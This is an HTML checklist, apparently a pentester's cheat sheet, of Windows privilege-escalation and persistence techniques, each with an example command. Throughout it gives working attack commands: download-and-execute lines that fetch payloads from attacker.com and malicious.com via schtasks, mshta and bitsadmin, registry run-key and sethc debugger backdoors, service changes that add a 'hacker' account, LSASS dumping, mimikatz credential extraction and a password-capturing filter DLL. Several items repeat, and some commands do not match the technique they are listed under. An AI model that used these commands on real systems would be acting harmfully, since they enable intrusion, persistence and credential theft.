    <main>
        <article>
            <h2>Checklist</h2>
            <ul>
                <li><input type="checkbox" id="exploiting-wmi-command-execution"><label for="exploiting-wmi-command-execution"><strong>Exploiting WMI Command Execution:</strong> Identify and exploit WMI command execution capabilities for privilege escalation. (Example: Execute arbitrary commands or scripts using WMI methods or classes to gain elevated privileges. Command: <code>wmic /node:"target" process call create "cmd.exe /c malicious.exe"</code>)</label></li>
                <li><input type="checkbox" id="exploiting-winlogon-hijacking"><label for="exploiting-winlogon-hijacking"><strong>Exploiting Winlogon Hijacking:</strong> Identify and exploit vulnerabilities in the Windows Logon (Winlogon) process for privilege escalation. (Example: Modify Winlogon registry settings or binaries to execute code during system startup with elevated privileges. Command: <code>reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "cmd.exe"</code>)</label></li>
                <li><input type="checkbox" id="exploiting-service-registry-keys"><label for="exploiting-service-registry-keys"><strong>Exploiting Service Registry Keys:</strong> Identify and exploit misconfigured or insecure service registry keys for privilege escalation. (Example: Modify service registry keys to execute arbitrary commands or binaries with elevated privileges. Command: <code>sc config servicename binpath= "cmd /K net user hacker Password123 /add"</code>)</label></li>
                <li><input type="checkbox" id="exploiting-registry-autoruns"><label for="exploiting-registry-autoruns"><strong>Exploiting Registry Autoruns:</strong> Identify and exploit autorun registry keys for privilege escalation. (Example: Add malicious entries to autorun registry keys to execute arbitrary commands or scripts with elevated privileges. Command: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Malicious /t REG_SZ /d "cmd.exe /c malicious.exe" /f</code>)</label></li>
                <li><input type="checkbox" id="exploiting-scheduled-tasks-powershell"><label for="exploiting-scheduled-tasks-powershell"><strong>Exploiting Scheduled Tasks with PowerShell:</strong> Identify and exploit scheduled tasks configured to run PowerShell scripts for privilege escalation. (Example: Modify scheduled task settings or script contents to execute arbitrary PowerShell commands with elevated privileges. Command: <code> schtasks /Change /TN "TaskName" /TR "powershell -c Invoke-Expression 'New-Object Net.WebClient.DownloadFile(\"http://attacker.com/malicious.ps1\", \"C:\\Windows\\Temp\\malicious.ps1\"); Start-Process C:\\Windows\\Temp\\malicious.ps1'"</code>)</label></li>
                <li><input type="checkbox" id="exploiting-powershell-runas"><label for="exploiting-powershell-runas"><strong>Exploiting PowerShell RunAs:</strong> Identify and exploit PowerShell RunAs functionality for privilege escalation. (Example: Use PowerShell RunAs to execute commands with elevated privileges by specifying alternate credentials or execution context. Command: <code>powershell -c Start-Process cmd -Credential (Get-Credential)</code>)</label></li>
                <li><input type="checkbox" id="exploiting-powershell-deployment-configurations"><label for="exploiting-powershell-deployment-configurations"><strong>Exploiting PowerShell Deployment Configurations:</strong> Identify and exploit misconfigured or insecure PowerShell deployment configurations for privilege escalation. (Example: Abuse PowerShell execution policies or script signing requirements to execute malicious scripts or commands with elevated privileges. Command: <code>powershell -ExecutionPolicy Bypass -File malicious.ps1</code>)</label></li>
                <li><input type="checkbox" id="exploiting-powershell-profiles"><label for="exploiting-powershell-profiles"><strong>Exploiting PowerShell Profiles:</strong> Identify and exploit misconfigured PowerShell profiles for privilege escalation. (Example: Modify user or system-level PowerShell profiles to execute commands with elevated privileges during user or system startup. Command: <code>notepad $PROFILE</code>)</label></li>
                <li><input type="checkbox" id="exploiting-smb-permissions"><label for="exploiting-smb-permissions"><strong>Exploiting SMB Permissions:</strong> Identify and exploit misconfigured or insecure Server Message Block (SMB) permissions for privilege escalation. (Example: Exploit weak SMB share permissions to access sensitive files or directories. Command: <code>net use \\target\share</code>)</label></li>
                <li><input type="checkbox" id="exploiting-file-associations"><label for="exploiting-file-associations"><strong>Exploiting File Associations:</strong> Identify and exploit misconfigured or insecure file associations for privilege escalation. (Example: Modify file association settings to execute arbitrary commands or scripts with elevated privileges. Command: <code>assoc .jpg=cmd /k</code>)</label></li>
                <li><input type="checkbox" id="exploiting-environment-variables"><label for="exploiting-environment-variables"><strong>Exploiting Environment Variables:</strong> Identify and exploit environment variables for privilege escalation. (Example: Modify or exploit environment variable settings to execute commands with elevated privileges. Command: <code>set PATH=C:\malicious;%PATH%</code>)</label></li>
                <li><input type="checkbox" id="exploiting-dll-hijacking"><label for="exploiting-dll-hijacking"><strong>Exploiting DLL Hijacking:</strong> Identify and exploit Dynamic Link Library (DLL) hijacking vulnerabilities for privilege escalation. (Example: Place a malicious DLL with the same name as a legitimate system DLL in a directory included in the system's DLL search path. Command: <code>copy malicious.dll C:\Windows\System32\</code>)</label></li>
                <li><input type="checkbox" id="exploiting-uac-bypass"><label for="exploiting-uac-bypass"><strong>Exploiting User Account Control (UAC) Bypass:</strong> Identify and exploit UAC bypass techniques for privilege escalation. (Example: Use known UAC bypass methods to execute commands or binaries with elevated privileges without triggering UAC prompts. Command: <code>reg add HKCU\Software\Classes\mscfile\shell\open\command /t REG_SZ /d "cmd /K"</code>)</label></li>
                <li><input type="checkbox" id="exploiting-powershell-dll-load"><label for="exploiting-powershell-dll-load"><strong>Exploiting PowerShell DLL Load:</strong> Identify and exploit DLL load vulnerabilities in PowerShell for privilege escalation. (Example: Load a malicious DLL from a writable directory to execute arbitrary code with elevated privileges. Command: <code>powershell -ep bypass -c Add-Type -Path C:\Path\To\Malicious.dll; [MaliciousClass]::Method()</code>)</label></li>
                <li><input type="checkbox" id="exploiting-hidden-services"><label for="exploiting-hidden-services"><strong>Exploiting Hidden Services:</strong> Identify and exploit hidden services or processes running with elevated privileges for privilege escalation. (Example: Abuse hidden services or processes to execute commands or scripts with elevated privileges. Command: <code>tasklist /svc</code>)</label></li>
                <li><input type="checkbox" id="exploiting-wmi-event-subscriptions"><label for="exploiting-wmi-event-subscriptions"><strong>Exploiting WMI Event Subscriptions:</strong> Identify and exploit WMI event subscriptions for privilege escalation. (Example: Register a malicious event filter or consumer to execute commands or scripts with elevated privileges. Command: <code>wmic /NAMESPACE:\\root\subscription PATH __EventFilter CREATE Name="MaliciousFilter", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour BETWEEN 11 AND 14"</code>)</label></li>
                <li><input type="checkbox" id="exploiting-persistence-mechanisms"><label for="exploiting-persistence-mechanisms"><strong>Exploiting Persistence Mechanisms:</strong> Identify and exploit persistence mechanisms for maintaining elevated privileges across system reboots. (Example: Modify or abuse scheduled tasks, startup programs, or services to execute commands or scripts with elevated privileges. Command: <code>schtasks /Create /SC ONSTART /TN MaliciousTask /TR "cmd /c malicious.exe" /RU System</code>)</label></li>
                <li><input type="checkbox" id="exploiting-kerberos-tickets"><label for="exploiting-kerberos-tickets"><strong>Exploiting Kerberos Tickets:</strong> Identify and exploit Kerberos ticket vulnerabilities for privilege escalation. (Example: Exploit Kerberos ticket-related misconfigurations or vulnerabilities to impersonate other users or gain elevated privileges. Command: <code>klist</code>)</label></li>
                <li><input type="checkbox" id="service-permissions"><label for="service-permissions"><strong>Exploit Weak Service Permissions:</strong> Modify service DACLs to gain full control over services and replace binary paths. (Command: <code>sc sdshow service</code> to show, <code>sc sdset service</code> to modify)</label></li>
                <li><input type="checkbox" id="alternate-data-streams"><label for="alternate-data-streams"><strong>Use Alternate Data Streams:</strong> Hide malicious scripts in NTFS alternate data streams to evade detection and maintain persistence. (Command: <code>echo 'malicious code' > file.txt:hidden.bat</code>)</label></li>
                <li><input type="checkbox" id="registry-persistence"><label for="registry-persistence"><strong>Registry Persistence:</strong> Use registry to maintain persistence by adding programs to startup. (Command: <code>reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "App" /d "path_to_malicious_executable"</code>)</label></li>
                <li><input type="checkbox" id="applocker-bypass"><label for="applocker-bypass"><strong>Bypass AppLocker:</strong> Exploit AppLocker misconfigurations to execute unauthorized applications or scripts. (Method: Utilize signed binaries like <code>msbuild</code>, <code>InstallUtil</code>, or <code>regsvr32</code> that can execute code.)</label></li>
                <li><input type="checkbox" id="signed-binary-proxy-execution"><label for="signed-binary-proxy-execution"><strong>Signed Binary Proxy Execution:</strong> Use Windows-signed binaries to proxy execution of malicious code. (Example: <code>mshta.exe http://malicious.com/malicious.hta</code>)</label></li>
                <li><input type="checkbox" id="password-filter-dll"><label for="password-filter-dll"><strong>Install Custom Password Filter DLL:</strong> Create and install a custom password filter DLL to capture passwords on change. (Example: <code>reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "Notification Packages" /t REG_MULTI_SZ /d mspassfilter</code>)</label></li>
                <li><input type="checkbox" id="token-impersonation"><label for="token-impersonation"><strong>Token Impersonation/Theft:</strong> Exploit token impersonation to execute commands with elevated privileges. (Tool: Incognito, Command: <code>list_tokens -u</code> and <code>impersonate_token "DOMAIN\\admin"</code>)</label></li>
                <li><input type="checkbox" id="bits-jobs"><label for="bits-jobs"><strong>Background Intelligent Transfer Service (BITS):</strong> Abuse BITS to download and execute malicious files bypassing firewalls. (Command: <code>bitsadmin /transfer n /download /priority high http://malicious.com/malicious.exe C:\Windows\temp\malicious.exe</code>)</label></li>
                <li><input type="checkbox" id="hot-patching"><label for="hot-patching"><strong>Exploit Hot Patching:</strong> Use undocumented Windows hot patching mechanisms to inject code into running processes. (Command: <code>n/a</code>, requires deep system knowledge)</label></li>
                <li><input type="checkbox" id="unattended-install-files"><label for="unattended-install-files"><strong>Exploit Unattended Install Files:</strong> Search for and leverage unattended installation files to extract sensitive information. (Example: <code>type C:\Windows\Panther\Unattend\Unattend.xml</code>)</label></li>
                <li><input type="checkbox" id="wmi-event-subscription"><label for="wmi-event-subscription"><strong>WMI Event Subscription:</strong> Use WMI for persistence and lateral movement by subscribing to permanent events. (Command: <code>Set-WmiInstance -Namespace root\Subscription -Class __EventFilter -Arguments @{name='malicious'; EventNameSpace='root\cimv2'; Query="SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'"}</code>)</label></li>
                <li><input type="checkbox" id="sid-history-injection"><label for="sid-history-injection"><strong>SID History Injection:</strong> Inject SID into token to gain privileges associated with another user. (Example: Use <code>Add-SIDHistory</code> PowerShell cmdlet)</label></li>
                <li><input type="checkbox" id="exploiting-smb-relay-attacks"><label for="exploiting-smb-relay-attacks"><strong>Exploiting SMB Relay Attacks:</strong> Identify and exploit SMB relay attacks for privilege escalation. (Example: Intercept SMB traffic and relay authentication requests to execute commands or access resources with elevated privileges. Command: <code>responder -I eth0 -rPv</code>)</label></li>
                <li><input type="checkbox" id="exploiting-dcom-privilege-escalation"><label for="exploiting-dcom-privilege-escalation"><strong>Exploiting DCOM Privilege Escalation:</strong> Identify and exploit Distributed Component Object Model (DCOM) misconfigurations or vulnerabilities for privilege escalation. (Example: Exploit insecure DCOM permissions or interfaces to execute commands or scripts with elevated privileges. Command: <code>sc config AppIDService binPath= "cmd /c malicious.exe" type= own</code>)</label></li>
                <li><input type="checkbox" id="exploiting-insecure-file-permissions"><label for="exploiting-insecure-file-permissions"><strong>Exploiting Insecure File Permissions:</strong> Identify and exploit insecure file permissions for privilege escalation. (Example: Exploit files or directories with weak permissions to execute commands with elevated privileges. Command: <code>icacls "C:\Program Files\Vulnerable Folder\" /grant Everyone:(OI)(CI)F</code>)</label></li>
                <li><input type="checkbox" id="exploiting-sudo-misconfigurations"><label for="exploiting-sudo-misconfigurations"><strong>Exploiting Sudo Misconfigurations:</strong> Identify and exploit misconfigured sudo privileges for privilege escalation. (Example: Abuse sudo configurations to execute commands with elevated privileges. Command: <code>sudo -l</code>)</label></li>
                <li><input type="checkbox" id="exploiting-misconfigured-services"><label for="exploiting-misconfigured-services"><strong>Exploiting Misconfigured Services:</strong> Identify and exploit misconfigured or vulnerable services for privilege escalation. (Example: Exploit insecure service configurations to execute commands with elevated privileges. Command: <code>sc config servicename binpath= "cmd /K net user hacker Password123 /add"</code>)</label></li>
                <li><input type="checkbox" id="exploiting-registry-acl-permissions"><label for="exploiting-registry-acl-permissions"><strong>Exploiting Registry ACL Permissions:</strong> Identify and exploit misconfigured registry ACL permissions for privilege escalation. (Example: Modify registry keys or values to execute commands with elevated privileges. Command: <code>reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Malicious /t REG_SZ /d "cmd.exe /c malicious.exe" /f</code>)</label></li>
                <li><input type="checkbox" id="exploiting-dll-hijacking-services"><label for="exploiting-dll-hijacking-services"><strong>Exploiting DLL Hijacking in Services:</strong> Identify and exploit DLL hijacking vulnerabilities in services for privilege escalation. (Example: Place a malicious DLL with the same name as a legitimate system DLL in a directory included in the system's DLL search path. Command: <code>copy malicious.dll C:\Windows\System32\</code>)</label></li>
                <li><input type="checkbox" id="exploiting-unquoted-service-paths"><label for="exploiting-unquoted-service-paths"><strong>Exploiting Unquoted Service Paths:</strong> Identify and exploit unquoted service paths for privilege escalation. (Example: Exploit services with unquoted paths to execute arbitrary commands or scripts with elevated privileges. Command: <code>sc qc ServiceName</code>)</label></li>
                <li><input type="checkbox" id="exploiting-registry-run-keys"><label for="exploiting-registry-run-keys"><strong>Exploiting Registry Run Keys:</strong> Identify and exploit misconfigured or insecure registry run keys for privilege escalation. (Example: Add malicious entries to registry run keys to execute arbitrary commands or scripts with elevated privileges. Command: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Malicious /t REG_SZ /d "cmd.exe /c malicious.exe" /f</code>)</label></li>
                <li><input type="checkbox" id="exploiting-unsafe-user-practices"><label for="exploiting-unsafe-user-practices"><strong>Exploiting Unsafe User Practices:</strong> Identify and exploit unsafe user practices for privilege escalation. (Example: Exploit users' behavior or actions to gain access or privileges beyond their intended scope. Command: <code>net use \\target\IPC$ "" /user:""</code>)</label></li>
                <li><input type="checkbox" id="exploiting-dpapi-vulnerabilities"><label for="exploiting-dpapi-vulnerabilities"><strong>Exploiting DPAPI Vulnerabilities:</strong> Identify and exploit vulnerabilities in the Data Protection API (DPAPI) for privilege escalation. (Example: Exploit weaknesses in DPAPI implementations to access encrypted data or credentials with elevated privileges. Command: <code> mimikatz "dpapi::capi" /in:"hash"</code>)</label></li>
                <li><input type="checkbox" id="exploiting-ntfs-permissions"><label for="exploiting-ntfs-permissions"><strong>Exploiting NTFS Permissions:</strong> Identify and exploit misconfigured NTFS permissions for privilege escalation. (Example: Exploit files or directories with weak permissions to execute commands with elevated privileges. Command: <code>icacls "C:\Program Files\Vulnerable Folder\" /grant Everyone:(OI)(CI)F</code>)</label></li>
                <li><input type="checkbox" id="exploiting-group-policy-misconfigurations"><label for="exploiting-group-policy-misconfigurations"><strong>Exploiting Group Policy Misconfigurations:</strong> Identify and exploit misconfigured Group Policy settings for privilege escalation. (Example: Exploit insecure Group Policy configurations to execute commands or scripts with elevated privileges. Command: <code>gpresult /SCOPE COMPUTER /Z</code>)</label></li>
                <li><input type="checkbox" id="exploiting-registry-autoruns"><label for="exploiting-registry-autoruns"><strong>Exploiting Registry Autoruns:</strong> Identify and exploit autorun registry keys for privilege escalation. (Example: Add malicious entries to autorun registry keys to execute arbitrary commands or scripts with elevated privileges. Command: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Malicious /t REG_SZ /d "cmd.exe /c malicious.exe" /f</code>)</label></li>
                <li><input type="checkbox" id="exploiting-scheduled-tasks"><label for="exploiting-scheduled-tasks"><strong>Exploiting Scheduled Tasks:</strong> Identify and exploit scheduled tasks for privilege escalation. (Example: Modify scheduled task settings or script contents to execute arbitrary commands or scripts with elevated privileges. Command: <code>schtasks /Change /TN "TaskName" /TR "C:\Path\To\malicious.exe"</code>)</label></li>
                <li><input type="checkbox" id="exploiting-unattended-installations"><label for="exploiting-unattended-installations"><strong>Exploiting Unattended Installations:</strong> Identify and exploit unattended installation configurations for privilege escalation. (Example: Modify or abuse unattended installation files to execute arbitrary commands or scripts with elevated privileges. Command: <code>reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v Malicious /t REG_SZ /d "C:\Path\To\malicious.exe" /f</code>)</label></li>
                <li><input type="checkbox" id="exploiting-process-privilege-escalation"><label for="exploiting-process-privilege-escalation"><strong>Exploiting Process Privilege Escalation:</strong> Identify and exploit processes running with elevated privileges for privilege escalation. (Example: Abuse processes or services running with SYSTEM or Administrator privileges to execute commands or access resources with elevated privileges. Command: <code>tasklist /V /FI "MEMUSAGE gt 1000000"</code>)</label></li>
                <li><input type="checkbox" id="exploiting-lsass-dump"><label for="exploiting-lsass-dump"><strong>Exploiting LSASS Dump:</strong> Identify and exploit LSASS memory dump vulnerabilities for privilege escalation. (Example: Dump LSASS memory to extract credentials or perform Pass-the-Hash attacks for elevated privileges. Command: <code>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</code>)</label></li>
                <li><input type="checkbox" id="exploiting-powerup-allchecks"><label for="exploiting-powerup-allchecks"><strong>Exploiting PowerUp AllChecks:</strong> Identify and exploit potential privilege escalation vectors using PowerUp's AllChecks module. (Example: Execute PowerUp's AllChecks to identify misconfigurations or vulnerabilities that can be exploited for privilege escalation. Command: <code>Import-Module PowerUp; Invoke-AllChecks</code>)</label></li>
                <li><input type="checkbox" id="wsl-misconfigurations"><label for="wsl-misconfigurations"><strong>Exploiting Windows Subsystem for Linux (WSL) Misconfigurations:</strong> Identify and exploit misconfigurations in WSL for privilege escalation. (Example: Access sensitive files or execute commands in the Windows environment from WSL using improper permissions.)</label></li>
                <li><input type="checkbox" id="user-env-vars"><label for="user-env-vars"><strong>Abusing User Environment Variables:</strong> Abuse user environment variables to execute malicious scripts or commands with elevated privileges. (Example: Exploit the PATH environment variable to execute a fake binary with higher privileges.)</label></li>
                <li><input type="checkbox" id="insecure-file-permissions"><label for="insecure-file-permissions"><strong>Exploiting Insecure File Permissions:</strong> Identify and exploit files with insecure permissions for privilege escalation. (Example: Modify configuration files or scripts with weak permissions to execute arbitrary commands.)</label></li>
                <li><input type="checkbox" id="user-installed-apps"><label for="user-installed-apps"><strong>Exploiting User-Installed Applications:</strong> Identify and exploit vulnerabilities in user-installed applications for privilege escalation. (Example: Exploit outdated or misconfigured software to gain access to sensitive system resources.)</label></li>
                <li><input type="checkbox" id="startup-programs"><label for="startup-programs"><strong>Abusing Startup Programs:</strong> Abuse startup programs to execute malicious scripts or commands with elevated privileges during system boot. (Example: Add a malicious entry to startup programs to gain persistence and execute commands as soon as the system starts.)</label></li>
                <li><input type="checkbox" id="scheduled-tasks-user"><label for="scheduled-tasks-user"><strong>Exploiting Scheduled Tasks with User Context:</strong> Identify and exploit scheduled tasks running in the user context for privilege escalation. (Example: Modify or hijack scheduled tasks to execute arbitrary commands with the user's privileges.)</label></li>
                <li><input type="checkbox" id="user-session-persistence"><label for="user-session-persistence"><strong>Abusing User Session Persistence Mechanisms:</strong> Abuse user session persistence mechanisms (e.g., session cookies, tokens) to gain unauthorized access to sensitive resources. (Example: Steal session cookies or tokens to impersonate authenticated users and access restricted areas.)</label></li>
                <li><input type="checkbox" id="sys-config-files"><label for="sys-config-files"><strong>Exploiting System-Level Configuration Files:</strong> Identify and exploit misconfigurations in system-level configuration files for privilege escalation. (Example: Modify critical system configuration files (e.g., /etc/passwd) to grant elevated privileges to a non-privileged user.)</label></li>
                <li><input type="checkbox" id="temp-file-permissions"><label for="temp-file-permissions"><strong>Abusing Temporary File Permissions:</strong> Abuse temporary files with insecure permissions to escalate privileges. (Example: Create or modify temporary files in a privileged directory to execute arbitrary commands.)</label></li>
                <li><input type="checkbox" id="ps-remoting-misconfig"><label for="ps-remoting-misconfig"><strong>Exploiting PowerShell Remoting Misconfigurations:</strong> Identify and exploit misconfigurations in PowerShell remoting settings for privilege escalation. (Example: Exploit insecure PowerShell remoting configurations to execute commands on remote systems with elevated privileges.)</label></li>
            </ul>
        </article>
